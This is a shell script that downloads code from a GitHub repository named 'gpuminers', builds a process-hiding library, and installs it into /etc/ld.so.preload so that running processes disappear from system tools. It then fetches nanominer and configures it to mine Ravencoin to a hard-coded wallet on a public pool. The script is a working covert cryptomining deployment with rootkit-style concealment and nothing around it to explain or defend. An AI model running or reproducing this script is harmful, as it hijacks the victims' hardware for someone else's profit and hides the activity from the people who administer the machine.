#!/bin/sh
export PATH=/usr/local/cuda/bin/:$PATH
export LD_LIBRARY_PATH=/usr/local/cuda/lib64/:$LD_LIBRARY_PATH
export LIBRARY_PATH=/usr/local/cuda/lib64:$LIBRARY_PATH

wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNan.zip
unzip magicNan.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://github.com/nanopool/nanominer/releases/download/v1.13.1/nanominer-linux-1.13.1.tar.gz
tar -xvzf nanominer-linux-1.13.1.tar.gz
cd nanominer-linux-1.13.1
rm config*
cat > config_rvn.ini <<END
[Kawpow]
wallet = RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj
coin = Rvn
rigName = Nano
pool1 = stratum.ravenminer.com:13838
END

cat > config.ini <<END
[Kawpow]
wallet = RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj
coin = Rvn
rigName = Nano
pool1 = stratum.ravenminer.com:13838
END

./nanominer
